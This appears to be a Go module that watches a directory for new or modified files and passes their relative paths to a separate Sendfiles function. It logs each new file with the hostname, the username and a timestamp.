package modules

import (
    "fmt"
    "os"
    "os/user"
    "path/filepath"  // Make sure this is imported
    "sync"
    "time"
)

type FileInfo struct {
    ModTime time.Time
    IsDir   bool
}

var (
    fileStates = make(map[string]FileInfo)
    mu         sync.RWMutex
)




func ScanDir(root string) {
    mu.Lock()
    defer mu.Unlock()

    filepath.WalkDir(root, func(path string, d os.DirEntry, err error) error {
        if err != nil {
            return err
        }

        info, err := d.Info()
        if err != nil {
            return err
        }

        prev, exists := fileStates[path]
        fileStates[path] = FileInfo{
            ModTime: info.ModTime(),
            IsDir:   info.IsDir(),
        }

        if !exists {
            fmt.Println(userdetails(), Timestamp(), "New file/folder:", path)

            if !info.IsDir() {
                relativePath, _ := filepath.Rel(root, path)
                Sendfiles(relativePath)
            }

        } else if !prev.ModTime.Equal(info.ModTime()) {

            if !info.IsDir() {
                relativePath, _ := filepath.Rel(root, path)
                Sendfiles(relativePath)
            }
        }

        return nil
    })

    // deletion logic unchanged
}  




func Timestamp() string {
    now := time.Now()
    return fmt.Sprintf("%d-%02d-%02d-%02d:%02d:%02d",
        now.Year(), now.Month(), now.Day(),
        now.Hour(), now.Minute(), now.Second())
}

func userdetails() string {
    hostname, _ := os.Hostname()
    u, _ := user.Current()
    return fmt.Sprintf("%s:%s", hostname, u.Username)
}
